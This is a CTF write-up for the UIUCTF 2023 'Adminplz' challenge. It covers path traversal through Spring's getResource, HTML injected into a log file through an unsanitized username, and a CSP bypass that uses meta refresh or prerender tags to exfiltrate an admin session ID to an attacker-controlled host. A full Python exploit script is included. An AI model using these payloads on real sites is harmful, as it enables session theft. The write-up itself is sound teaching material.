# Adminplz writeup

**Adminplz** was a interesting challenge in UIUCTF 2023 that involved a path traversal exploit as well as a CSP bypass that was used to steal the session token of a admin user. While I was able to solve the challenge the intended way, I want to also discuss on a slightly interesting tangent that I went down while looking for other ways to solve the CSP bypass.

## Description

> your daily dose of ☕
>
> [instancer](https://adminplz.chal.uiuc.tf/)
>
> [`handout.tar.gz`](./handout.tar.gz)

## Intial recon

The tar.gz file associated with the challenge had a java web app made using the Spring framework that allowed users to login and view a admin endpoint that was only restricted to admin users.
<details>

<summary>AdminApplication.java</summary>

```java
package dev.arxenix.adminplz;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpSession;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.core.io.Resource;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;

@SpringBootApplication
@RestController
public class AdminApplication {
    private static final Logger logger
            = LoggerFactory.getLogger(AdminApplication.class);
    private static String ADMIN_PASSWORD;
    private static ApplicationContext app;

    public static void main(String[] args) {
        app = SpringApplication.run(AdminApplication.class, args);
        ADMIN_PASSWORD = System.getenv("ADMIN_PASSWORD");
    }

    @PostMapping(path = "/login", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
    public String login(HttpSession session, User user) {
        if (user.getUsername().equals("admin") && !user.getPassword().equals(ADMIN_PASSWORD)) {
            return "not allowed";
        }
        session.setAttribute("user", user);
        return "logged in";
    }

    public boolean isAdmin(HttpServletRequest req, HttpSession session) {
        return req.getRemoteAddr().equals("127.0.0.1") || (
                isLoggedIn(session) && ((User) session.getAttribute("user")).getUsername().equals("admin")
        );
    }

    public boolean isLoggedIn(HttpSession session) {
        return session.getAttribute("user") != null;
    }

    long lastBotRun = 0;

    @PostMapping(path = "/report", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
    public String report(String url) throws IOException {
        if (url == null || !(url.startsWith("http://") || url.startsWith("https://")))
            return "invalid url";

        long time = System.currentTimeMillis();
        if (time - lastBotRun < 300000) {
            return "too soon! (please wait 5min)";
        }
        lastBotRun = time;

        Runtime.getRuntime().exec(new String[]{"node", "bot.js", url});
        return "an admin will check your url!";
    }

    @GetMapping("/")
    public Resource index(HttpServletRequest req) {
        return app.getResource("index.html");
    }

    @GetMapping("/admin")
    public Resource admin(HttpServletRequest req, HttpSession session, @RequestParam String view) {
        if (isLoggedIn(session) && view.contains("flag")) {
            logger.warn("user {} [{}] attempted to access restricted view", ((User) session.getAttribute("user")).getUsername(), session.getId());
        }
        return app.getResource(isAdmin(req, session) ? view : "error.html");
    }
}
```
</details>

<details>
<summary>CSP.java</summary>
package dev.arxenix.adminplz;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Component;

import java.io.IOException;

@Component
public class CSP implements Filter {
    @Override
    public void doFilter(ServletRequest request,
                         ServletResponse response,
                         FilterChain chain) throws ServletException, IOException {
        ((HttpServletResponse) response).addHeader("Content-Security-Policy", "default-src 'none';");
        chain.doFilter(request, response);
    }
}
</details>

On a initial look, a few things stood out to me, firstly, the CSP for the app was `default-src 'none';` which is a extremely restrictive CSP that disallows almost every form of connection from the host website, secondly, the `/admin` endpoint used a function `app.getResource(...)` that according to [documentation on the web](https://docs.spring.io/spring-framework/reference/core/resources.html#resources-resourceloader) seemed to be capable of accepting almost any web URL as well as the `classpath:` URI.

```java
@GetMapping("/admin")
public Resource admin(HttpServletRequest req, HttpSession session, @RequestParam String view) {
    if (isLoggedIn(session) && view.contains("flag")) {
        logger.warn("user {} [{}] attempted to access restricted view", ((User) session.getAttribute("user")).getUsername(), session.getId());
    }
    return app.getResource(isAdmin(req, session) ? view : "error.html");
}
```

## The `classpath:` to nowhere

> NOTE
> If you haven't checked it out, I would highly recommend [Liveoverflow's Log4Shell videos](https://www.youtube.com/watch?v=w2F67LbEtnk) where he goes deep into the Java code and understands how the Log4J code allowed for the exploit to happen.

I wasn't really familiar with Spring Java web applications, so looking at the code I assumed that the exploit for this challenge would look similar to the well known [Log4Shell JNDI exploit](https://securityboulevard.com/2021/12/log4shell-jndi-injection-via-attackable-log4j/), where you would load a malicious class using `classpath:/.../.../` that would somehow interact with the response handling code to suppress the CSP filtering mechanism. However, despite trying for multiple hours and reading a bunch of similar apps and documentation, I wasn't able to build a PoC that was able to inject malicious code in the Java app :(

## Path traversal

After several hours, when I wasn't able to build a PoC, I decided to re-review what I knew about `app.getResource(...)`. While looking through resources, I came across [this interesting blogpost from invicti.com](https://www.invicti.com/white-papers/exploiting-path-traversal-vulnerabilities-java-web-applications-technical-paper/) that detailed a path traversal strategy that could work for `app.getResource(...)` like functions. The idea was that if the string being passed was unsanitized, it could be used to load local files using the `file:///` URI as mentioned in the documentation. This made a lot more sense since I realized that in the given dockerfile, the `flag.html` was placed outside the public folder from which the rest of the html files were being loaded which meant we had to ask the admin to visit `http://127.0.0.1:8080/admin?view=file:///flag.html` for the flag to be adequately visible.

```dockerfile
COPY public ./public
COPY flag.html /flag.html
```

## Unsantized logging

However, while I had solved some parts of the problem, I still wasn't sure of how I could load arbitrary HTML/exfiltrate the flag from the `flag.html` page. The `flag.html` page itself was a static page with no components that could be interacted from by the user and the extremely restrictive CSP still remained.

With this in mind, when I reviewed the Java code again, I noticed that the admin endpoint would log a unsantized version of a user-controlled username whenever a non-admin user tried to access the forbidden admin endpoint. This was especially interesting since it the app also logged the user session id of every user in the same log, which meant that if we visited the site before the admin, we would be able to have the session ID as part of some kind of HTML markup like so:

```log
WARN  d.arxenix.adminplz.AdminApplication - user <some_html_here> [09002AAFA885295923598DE6174944D6] attempted to access restricted view
WARN  d.arxenix.adminplz.AdminApplication - user admin [09002AAFA885295923598DE6174944D6] attempted to access restricted view
WARN  d.arxenix.adminplz.AdminApplication - user <some_other_html_here> [09002AAFA885295923598DE6174944D6] attempted to access restricted view
```

which could then be used to exfiltrate the flag by loading the log using the admin endpoint with the following URL `http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log`

## Exfiltrating the flag

Once I had figured this out, I was still left with an extremely restrictive CSP, `default-src 'none';` which disallowed almost all connections for the current page and also prevented any scripts, CSS or JS from loading. To bypass this CSP, I decided to fuzz some common HTML tags and look through the documentation. After going through a bunch of tags and obscure HTML tricks and weird edge cases [^1], fuzzing and checking if they could somehow be used to exfiltrate data (and/or) communicate with the outer world.

After quite a long amount of time I found two interesting bypasses, one was to use a meta tag to redirect the user to our domain like so:

```html
<meta http-equiv="refresh" content="0;url=https://google.com?data=[stuff]...
...
...">
```

and the other one was to do something similar with link prerendering:

```html
<link rel="prerender" href="https://google.com?data=[stuff]
..
..">
```

Both of these, would allow me to exfil the administrators session data, however, since we were in a headless pupeteer session in the admin bot and I was unsure if `prerender` would work in that setting, I decided to go with the meta tag.

> **TANGENT**
>
> Did you know that you can nest `<object>` tags inside of each other and if the outer one fails the page tries to load the inner one ?  I sure didn't, and found it out purely by luck. This seems a interesting way to detect 500/400 status codes without any freaking Javascript. Short example of how it can be used.
>```html
><object data="https://docs.google.com/document/d/17ms5USH8Fx_bdmrc0PHFHHJ40b3aT0NG6UDw0FMwVhM/edit?usp=sharing">
>    <object data="/is_not_part_of_some_org"></object>
></object>
>```

[^1]: A great place to start learning about and identifying weird edge cases is the [xsleaks wiki](https://xsleaks.dev) and the [DOMPurify tests](https://github.com/cure53/DOMPurify/blob/main/test/test-suite.js). For documentation regarding these, [MDN docs](https://developer.mozilla.org) and the [Web specifications](https://spec.whatwg.org/) are pretty good as well.

## A trip down CSP lane (after the CTF finished)

Despite having all the building blocks to the challenge, I still had a nagging feeling of not understanding how/why the CSP bypasses were possible, why were only the meta and the prerender tag were allowed to break the CSP. Once the CTF was over I decided to dive into the Chrome code to get some idea about why/how these bypasses were possible.

As it turns out Chrome has a [multi-process architecture](https://www.chromium.org/developers/design-documents/multi-process-architecture/aaa), including (but not restricted to) the Blink rendering engine (as part of the sandboxed renderer), a networking process, and a content process. When some markup want to load a resource, most of the time, it will trigger the [`ResourceFetcher`](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/loader/fetch/resource_fetcher.cc;bpv=1;bpt=1) class APIs which then interfaces with the networking process to load the data. Most of the CSP related filtering happens inside of the `ResourceFetcher` class, via the [`BaseFetchContext::CheckCSPForRequest(....)`](https://source.chromium.org/chromium/chromium/src/+/refs/heads/main:third_party/blink/renderer/platform/loader/fetch/fetch_context.h;drc=255b4e7036f1326f2219bd547d3d6dcf76064870;bpv=1;bpt=1;l=131) method even before the request is sent (or after the request occur but before a redirect is sent). However, a lot of the times for certain HTML/JS, APIs will load content via sending them to other processes, in our case the meta tag sends a navigation request to the content process where the CSP is not explicitly check, allowing us to connect to our server and send data. For the prerender operation, Chrome recently introduced the [NoStatePrefetch](https://developer.chrome.com/blog/nostate-prefetch/) a mechanism where the prerendering happens in a [different sandboxed process with a slimmed down version of the blink renderer](https://source.chromium.org/chromium/chromium/src/+/main:components/no_state_prefetch/;bpv=1;bpt=0)[^2], since Chrome also doesn't check CSP in this process, we are also able to exfil data via this method.

[^2]: The link goes to the directory where no state prefetch is implemented, as you can see, the system implements their own browser, renderer components
## Building the exploit

Coming back to the CTF challenge, with most of the building blocks in place, all I had to do was put it in a python script. The final sequence of actions were as follows:

- Login and visit the `/admin` endpoint with a username similar `<meta http-equiv="refresh" content="0;url=https://url.com?data=`
- Make the admin bot visit the flag
- Login again and visit `/admin` with a username similar to `">` to close the meta tag
- Wait until the `/report` endpoints timeout finishes
- Make the admin bot visit the logs
- Retrieve the session cookie of the admin and visit flag.html with the admin cookie in the browser

## Final exploit

```py
import requests as rq
import time

r = rq.Session()

DEF_URL='http://127.0.0.1:1337'

def report(url):
    resp = r.post(f'{DEF_URL}/report', data={'url': url})
    print(resp.text)

def login(username):
    resp = r.post(f'{DEF_URL}/login', data={'username': username, 'password': 'abc'})
    print(resp.text)

def visit():
    resp = r.get(f'{DEF_URL}/admin?view=flag')
    print(resp.text)


if __name__ == '__main__':
    login('<meta http-equiv="refresh" content="0;url=https://a.url.i.control.com/?data=')
    visit()
    report('http://127.0.0.1:8080/admin?view=file:///flag.html')
    print('Sleeping for 1min')
    time.sleep(1 * 60)
    print('Waking up, execute second payload')
    login('"></meta>')
    visit()
    for i in range(4):
        print('Sleeping for 1min')
        time.sleep(1 * 60)
    print('Waking up, execute last payload')
    report('http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log')
```

## Flag

Flag: ```uiuctf{adminplz_c4n_1_h4v3_s0M3_co0k13s?_b5eab1cc61c26f07e63af7f8}```